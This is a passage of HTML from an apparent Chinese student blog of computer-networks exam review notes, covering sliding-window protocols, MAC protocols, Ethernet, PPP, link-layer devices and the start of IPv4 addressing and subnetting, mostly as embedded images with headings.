src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213901176.png" alt="image-20211204213901176"></p><h3 id="GBN发送方做的事"><a href="#GBN发送方做的事" class="headerlink" title="GBN发送方做的事"></a>GBN发送方做的事</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213935827.png" alt="image-20211204213935827"></p><h3 id="GBN接收方做的事"><a href="#GBN接收方做的事" class="headerlink" title="GBN接收方做的事"></a>GBN接收方做的事</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204214003035.png" alt="image-20211204214003035"></p><h3 id="运行中GBN"><a href="#运行中GBN" class="headerlink" title="运行中GBN**"></a>运行中GBN**</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204214210010.png" alt="image-20211204214210010"></p><h3 id="GBN滑动窗口的大小"><a href="#GBN滑动窗口的大小" class="headerlink" title="GBN滑动窗口的大小"></a>GBN滑动窗口的大小</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204215211156.png" alt="image-20211204215211156"></p><h3 id="GBN协议总结"><a href="#GBN协议总结" class="headerlink" title="GBN协议总结"></a>GBN协议总结</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204215244572.png" alt="image-20211204215244572"></p><h3 id="GBN协议例题"><a href="#GBN协议例题" class="headerlink" title="GBN协议例题"></a>GBN协议例题</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204215306420.png" alt="image-20211204215306420"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204220749953.png" alt="image-20211204220749953"></p><p>修正：3.应该是第一个ACK</p><h2 id="选择重传协议SR"><a href="#选择重传协议SR" class="headerlink" title="选择重传协议SR"></a>选择重传协议SR</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204221247315.png" alt="image-20211204221247315"></p><h3 id="SR发送方需要响应的事"><a href="#SR发送方需要响应的事" class="headerlink" title="SR发送方需要响应的事"></a>SR发送方需要响应的事</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204221314886.png" alt="image-20211204221314886"></p><h3 id="SR接收方做的事"><a href="#SR接收方做的事" class="headerlink" title="SR接收方做的事"></a>SR接收方做的事</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204221338837.png" alt="image-20211204221338837"></p><h3 id="运行中的SR"><a href="#运行中的SR" class="headerlink" title="运行中的SR"></a>运行中的SR</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204221412559.png" alt="image-20211204221412559"></p><h3 id="SR滑动窗口的长度"><a href="#SR滑动窗口的长度" class="headerlink" title="SR滑动窗口的长度"></a>SR滑动窗口的长度</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204221435635.png" alt="image-20211204221435635"></p><h3 id="SR总结"><a href="#SR总结" class="headerlink" title="SR总结"></a>SR总结</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204221454374.png" alt="image-20211204221454374"></p><h3 id="SR协议例题"><a href="#SR协议例题" class="headerlink" title="SR协议例题"></a>SR协议例题</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204221509579.png" alt="image-20211204221509579"></p><h2 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h2><p>所谓介质访问控制，说白了就是在共享信道中，我们需要考虑一个重要的问题，那就是如何控制多个用户共同使用一个信道。于是就有了一下分类。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205210414080.png" alt="image-20211205210414080"></p><p>其中静态划分信道，是在通信之前就分配好了信道。这种方式不会发生冲突，但是这种方式代价高，不适应于局域网通信。</p><p>在网络负载大的情况下，静态划分利用率高。</p><p>在网络负载不大的时候，动态分配利用率高。</p><h3 id="ALOHA协议"><a href="#ALOHA协议" class="headerlink" title="ALOHA协议"></a>ALOHA协议</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205210436913.png" alt="image-20211205210436913"></p><p>2、时隙ALOHA协议</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205210457126.png" alt="image-20211205210457126"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205210503722.png" alt="image-20211205210503722"></p><h2 id="CSMA（载波监听多路访问协议）"><a href="#CSMA（载波监听多路访问协议）" class="headerlink" title="CSMA（载波监听多路访问协议）**"></a>CSMA（载波监听多路访问协议）**</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205210905894.png" alt="image-20211205210905894"></p><h3 id="1-坚持CSMA"><a href="#1-坚持CSMA" class="headerlink" title="1-坚持CSMA"></a>1-坚持CSMA</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205210936431.png" alt="image-20211205210936431"></p><h3 id="非坚持CSMA"><a href="#非坚持CSMA" class="headerlink" title="非坚持CSMA"></a>非坚持CSMA</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205210950734.png" alt="image-20211205210950734"></p><h3 id="p-坚持CSMA"><a href="#p-坚持CSMA" class="headerlink" title="p-坚持CSMA"></a>p-坚持CSMA</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211015840.png" alt="image-20211205211015840"></p><h3 id="三种CSMA对比"><a href="#三种CSMA对比" class="headerlink" title="三种CSMA对比"></a>三种CSMA对比</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211033632.png" alt="image-20211205211033632"></p><h2 id="CSMA-x2F-CD协议"><a href="#CSMA-x2F-CD协议" class="headerlink" title="CSMA/CD协议***"></a>CSMA/CD协议***</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211058337.png" alt="image-20211205211058337"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211557370.png" alt="image-20211205211557370"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211811641.png" alt="image-20211205211811641"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211902879.png" alt="image-20211205211902879"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211131045.png" alt="image-20211205211131045"></p><p>有可能发生如下情况因此需要确定碰撞后的重传时机</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205211204368.png" alt="image-20211205211204368"></p><h3 id="截断二进制指数规避算法"><a href="#截断二进制指数规避算法" class="headerlink" title="截断二进制指数规避算法"></a>截断二进制指数规避算法</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212143500.png" alt="image-20211205212143500"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212209112.png" alt="image-20211205212209112"></p><h3 id="最小帧长问题"><a href="#最小帧长问题" class="headerlink" title="最小帧长问题"></a>最小帧长问题</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212301736.png" alt="image-20211205212301736"></p><p>64字节是对于10Mb/s的以太网。</p><h2 id="CSMA-x2F-CA协议"><a href="#CSMA-x2F-CA协议" class="headerlink" title="CSMA/CA协议"></a>CSMA/CA协议</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212446674.png" alt="image-20211205212446674"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212458259.png" alt="image-20211205212458259"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212506424.png" alt="image-20211205212506424"></p><h2 id="轮询访问介质控制"><a href="#轮询访问介质控制" class="headerlink" title="轮询访问介质控制"></a>轮询访问介质控制</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212550998.png" alt="image-20211205212550998"></p><h3 id="令牌传递协议"><a href="#令牌传递协议" class="headerlink" title="令牌传递协议"></a>令牌传递协议</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212641300.png" alt="image-20211205212641300"></p><h3 id="MAC协议总结"><a href="#MAC协议总结" class="headerlink" title="MAC协议总结"></a>MAC协议总结</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212736230.png" alt="image-20211205212736230"></p><h2 id="局域网基本概念和体系"><a href="#局域网基本概念和体系" class="headerlink" title="局域网基本概念和体系"></a>局域网基本概念和体系</h2><h3 id="局域网概念"><a href="#局域网概念" class="headerlink" title="局域网概念"></a>局域网概念</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212806220.png" alt="image-20211205212806220"></p><h3 id="局域网拓扑图"><a href="#局域网拓扑图" class="headerlink" title="局域网拓扑图"></a>局域网拓扑图</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212821520.png" alt="image-20211205212821520"></p><h3 id="局域网传输介质"><a href="#局域网传输介质" class="headerlink" title="局域网传输介质"></a>局域网传输介质</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212849633.png" alt="image-20211205212849633"></p><h3 id="局域网介质访问控制方法"><a href="#局域网介质访问控制方法" class="headerlink" title="局域网介质访问控制方法"></a>局域网介质访问控制方法</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212901979.png" alt="image-20211205212901979"></p><h3 id="局域网的分类"><a href="#局域网的分类" class="headerlink" title="局域网的分类"></a>局域网的分类</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212918935.png" alt="image-20211205212918935"></p><h3 id="MAC子层和LLC子层"><a href="#MAC子层和LLC子层" class="headerlink" title="MAC子层和LLC子层"></a>MAC子层和LLC子层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205212948564.png" alt="image-20211205212948564"></p><h2 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213045038.png" alt="image-20211205213045038"></p><p><strong>以太网只实现无差错接收，不实现可靠传输。</strong></p><h3 id="以太网拓扑"><a href="#以太网拓扑" class="headerlink" title="以太网拓扑"></a>以太网拓扑</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213134093.png" alt="image-20211205213134093"></p><h3 id="10-base-T以太网"><a href="#10-base-T以太网" class="headerlink" title="10-base-T以太网"></a>10-base-T以太网</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213153154.png" alt="image-20211205213153154"></p><h3 id="适配器与MAC地址"><a href="#适配器与MAC地址" class="headerlink" title="适配器与MAC地址"></a>适配器与MAC地址</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213219598.png" alt="image-20211205213219598"></p><h3 id="以太网的MAC帧"><a href="#以太网的MAC帧" class="headerlink" title="以太网的MAC帧"></a>以太网的MAC帧</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213420370.png" alt="image-20211205213420370"></p><h2 id="IEEE-802-11无线局域网"><a href="#IEEE-802-11无线局域网" class="headerlink" title="IEEE 802.11无线局域网"></a>IEEE 802.11无线局域网</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213556404.png" alt="image-20211205213556404"></p><h2 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h2><p>PPP协议用在广域网中</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213633116.png" alt="image-20211205213633116"></p><h3 id="PPP协议的特点"><a href="#PPP协议的特点" class="headerlink" title="PPP协议的特点"></a>PPP协议的特点</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213647868.png" alt="image-20211205213647868"></p><h3 id="PPP协议应满足的要求"><a href="#PPP协议应满足的要求" class="headerlink" title="PPP协议应满足的要求"></a>PPP协议应满足的要求</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213702339.png" alt="image-20211205213702339"></p><h3 id="PPP协议的三个组成部分"><a href="#PPP协议的三个组成部分" class="headerlink" title="PPP协议的三个组成部分"></a>PPP协议的三个组成部分</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213732959.png" alt="image-20211205213732959"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213758066.png" alt="image-20211205213758066"></p><h3 id="PPP协议的帧格式"><a href="#PPP协议的帧格式" class="headerlink" title="PPP协议的帧格式"></a>PPP协议的帧格式</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213815619.png" alt="image-20211205213815619"></p><h2 id="链路层设备"><a href="#链路层设备" class="headerlink" title="链路层设备"></a>链路层设备</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205213908169.png" alt="image-20211205213908169"></p><p>集线器只是单纯的把数据群发，并不能隔离冲突域。集线器的意义在于能够简化总线型的连接方式。</p><h3 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a>网桥</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205214112446.png" alt="image-20211205214112446"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205214125524.png" alt="image-20211205214125524"></p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205214216489.png" alt="image-20211205214216489"></p><h3 id="广播域和冲突域"><a href="#广播域和冲突域" class="headerlink" title="广播域和冲突域**"></a>广播域和冲突域**</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205214237048.png" alt="image-20211205214237048"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211205214318378.png" alt="image-20211205214318378"></p><p>例如： 有十个站连接到了以太网。计算每个站能得到的带宽。</p><ol><li>10个站都连接在一个10Mb/s的以太网集线器上：1Mb/s</li><li>10个站都连接在一个100Mb/s的以太网集线器上：10Mb/s</li><li>10个站都连接在一个10Mb/s的以太网交换机上：10Mb/s</li></ol><h2 id="第三章题目总结：）"><a href="#第三章题目总结：）" class="headerlink" title="第三章题目总结：）"></a>第三章题目总结：）</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211206090324829.png" alt="image-20211206090324829"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211206090350759.png" alt="image-20211206090350759"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211206090416538.png" alt="image-20211206090416538"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211206090507660.png" alt="image-20211206090507660"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211206091128534.png" alt="image-20211206091128534"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211206091207175.png" alt="image-20211206091207175"></p><h1 id="第四章：网络层"><a href="#第四章：网络层" class="headerlink" title="第四章：网络层"></a>第四章：网络层</h1><h2 id="知识概览"><a href="#知识概览" class="headerlink" title="知识概览"></a>知识概览</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205144520.png" alt="image-20211221205144520"></p><h2 id="网络层功能"><a href="#网络层功能" class="headerlink" title="网络层功能"></a>网络层功能</h2><h3 id="1、路由选择与分组转发"><a href="#1、路由选择与分组转发" class="headerlink" title="1、路由选择与分组转发"></a>1、路由选择与分组转发</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205223576.png" alt="image-20211221205223576"></p><h3 id="2、拥塞控制"><a href="#2、拥塞控制" class="headerlink" title="2、拥塞控制"></a>2、拥塞控制</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205241904.png" alt="image-20211221205241904"></p><h2 id="网络的数据包IP数据报"><a href="#网络的数据包IP数据报" class="headerlink" title="网络的数据包IP数据报"></a>网络的数据包IP数据报</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205312216.png" alt="image-20211221205312216"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205328299.png" alt="image-20211221205328299"></p><p><strong>IP数据报的首部固定为20B，并且为4的倍数</strong></p><h3 id="IP数据报的分片"><a href="#IP数据报的分片" class="headerlink" title="IP数据报的分片"></a>IP数据报的分片</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205514669.png" alt="image-20211221205514669"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205533075.png" alt="image-20211221205533075"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205629289.png" alt="image-20211221205629289"></p><h2 id="IPV4地址"><a href="#IPV4地址" class="headerlink" title="IPV4地址"></a>IPV4地址</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205653213.png" alt="image-20211221205653213"></p><h3 id="分类的IP地址"><a href="#分类的IP地址" class="headerlink" title="分类的IP地址"></a>分类的IP地址</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205714490.png" alt="image-20211221205714490"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205732837.png" alt="image-20211221205732837"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205759320.png" alt="image-20211221205759320"></p><h3 id="私有IP"><a href="#私有IP" class="headerlink" title="私有IP"></a>私有IP</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205745293.png" alt="image-20211221205745293"></p><h2 id="NAT地址转换"><a href="#NAT地址转换" class="headerlink" title="NAT地址转换"></a>NAT地址转换</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205826251.png" alt="image-20211221205826251"></p><h2 id="子网划分与子网掩码"><a href="#子网划分与子网掩码" class="headerlink" title="子网划分与子网掩码**"></a>子网划分与子网掩码**</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205900706.png" alt="image-20211221205900706"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205914921.png" alt="image-20211221205914921"></p><h3 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221205930993.png" alt="image-20211221205930993"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221210140674.png" alt="image-20211221210140674"></p><p><strong>纠正： 141.14.64.0</strong></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211221211821508.png" alt="image-20211221211821508"></p><h3 id="使用子网时分组的转发"><a href="#使用子网时分组的转发" class="headerlink" title="使用子网时分组的转发"></a>使用子网时分组的转发</h3><p><img 